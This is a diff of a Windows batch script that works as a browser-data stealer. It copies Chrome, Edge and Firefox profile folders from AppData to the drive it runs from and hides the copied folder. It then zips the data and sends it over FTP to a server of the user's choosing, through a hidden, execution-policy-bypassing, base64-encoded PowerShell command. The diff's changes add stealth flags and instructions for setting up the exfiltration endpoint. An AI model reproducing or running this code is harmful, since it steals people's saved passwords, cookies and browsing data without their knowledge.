@@ -22,15 +22,15 @@ xcopy "C:\Users\%username%\AppData\Local\Google" "%~d0\db" /E /H /C /I
 xcopy "C:\Users\%username%\AppData\Local\Microsoft" "%~d0\db" /E /H /C /I
 xcopy "C:\Users\%username%\AppData\Roaming\Mozilla" "%~d0\db" /E /H /C /I
 :: Hide the path where the data was saved
-attrib +h +s "%~d0\db"
+attrib + r +i +h +s "%~d0\db"
 :: Compress the data into a zip file
-powershell -command "Compress-Archive -Path '%fff%' -DestinationPath '%ffff%' -Force"
+powershell -nop -noni -w hidden -ep bypass -c "Compress-Archive -Path '%fff%' -DestinationPath '%ffff%' -Force"
 timeout 20 >nul
 
 :: Send zip file over FTP
 
-powershell -EncodedCommand
-:: Start an FTP server and configure this with your FTP server's public IP and open port then encode this in Base64 and paste the encoded content in the powershell -EncodedCommand
+powershell -nop -noni -w hidden -ep bypass -ec "ENCODED BLOB HERE"
+:: Start an FTP server and configure this with your FTP server's public IP and open port then encode this in Base64 and paste the encoded content in the powershell -nop -noni -w hidden -ep bypass -ec ""
 :: $ftp = "ftp://<FTP's public IP:<FTP's open port>"
 :: $user = "user"
 :: $pass = "12345"
